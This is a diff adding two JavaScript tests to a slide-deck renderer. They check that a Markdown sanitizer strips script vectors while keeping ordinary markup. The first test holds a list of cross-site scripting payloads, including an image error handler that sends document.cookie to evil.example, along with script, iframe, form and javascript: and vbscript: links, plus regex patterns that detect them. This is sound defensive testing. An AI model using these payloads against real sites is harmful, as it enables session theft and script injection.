@@ -391,3 +391,90 @@ test("The type size option is gone from every surface", async () => {
   assert.ok(deck.includes("--slide-pad-y: 4.4rem"));
   assert.ok(deck.includes("--slide-pad-x: 6rem"));
 });
+
+test("Untrusted deck Markdown cannot execute script", () => {
+  const payload = [
+    "# Slide",
+    "",
+    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
+    "",
+    "<script>alert(1)</script>",
+    "",
+    "[click me](javascript:alert(2))",
+    "",
+    '<iframe src="https://evil.example"></iframe>',
+    '<object data="x"></object>',
+    '<embed src="x">',
+    '<a href="data:text/html,<script>alert(3)</script>">data link</a>',
+    '<svg><animate onbegin="alert(4)" attributeName="x"></svg>',
+    '<form action="https://evil.example"><input name=p></form>',
+    "<style>body{background:url('https://evil.example/beacon')}</style>",
+    "<img src=\"x\" onload=alert(5)>",
+    '<a href="vbscript:alert(6)">vb</a>',
+    "<details open ontoggle=alert(7)>x</details>",
+  ].join("\n");
+
+  const html = parseSlides(payload)[0].html;
+  for (const [name, pattern] of Object.entries({
+    "event handler": /on[a-z]+\s*=/i,
+    "script tag": /<script/i,
+    "javascript: href": /javascript:/i,
+    "iframe": /<iframe/i,
+    "object": /<object/i,
+    "embed": /<embed/i,
+    "vbscript:": /vbscript:/i,
+    "form": /<form/i,
+    "data:text/html": /data:text\/html/i,
+    "style block contents": /evil\.example\/beacon/i,
+  })) {
+    assert.ok(!pattern.test(html), `${name} survived sanitizing`);
+  }
+});
+
+test("Sanitizing keeps the markup decks actually use", () => {
+  const html = parseSlides(
+    [
+      "# Heading",
+      "",
+      "**bold**, *em*, `code`",
+      "",
+      "- one",
+      "- two",
+      "",
+      "| x | y |",
+      "|---|---|",
+      "| 1 | 2 |",
+      "",
+      "[link](https://example.com)",
+      "",
+      "![alt](pic.png)",
+      "",
+      '<div class="cols"><span style="color:red">styled</span></div>',
+      "",
+      '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="blue"/></svg>',
+      "",
+      "$$",
+      "x = y",
+      "$$",
+      "",
+      "```mermaid",
+      "graph TD; A-->B;",
+      "```",
+    ].join("\n")
+  )[0].html;
+
+  assert.match(html, /<h1>Heading<\/h1>/);
+  assert.match(html, /<strong>bold<\/strong>/);
+  assert.match(html, /<table>/);
+  assert.match(html, /<a href="https:\/\/example\.com">link<\/a>/);
+  assert.match(html, /<img src="pic\.png" alt="alt"/);
+  assert.match(html, /<div class="cols">/);
+  assert.match(html, /style="color:red"/);
+  assert.match(html, /<svg viewbox="0 0 10 10">/i, "inline SVG survives with its viewBox");
+  assert.match(html, /class="math-source" data-display="true"/, "deckrun's own data attributes survive");
+  assert.match(html, /class="language-mermaid"/, "mermaid fences reach the renderer");
+
+  // An inline image data URI is still usable; other data: URIs are not.
+  const dataImg = parseSlides('<img src="data:image/png;base64,iVBORw0KGgo=">')[0].html;
+  assert.match(dataImg, /data:image\/png/);
+});
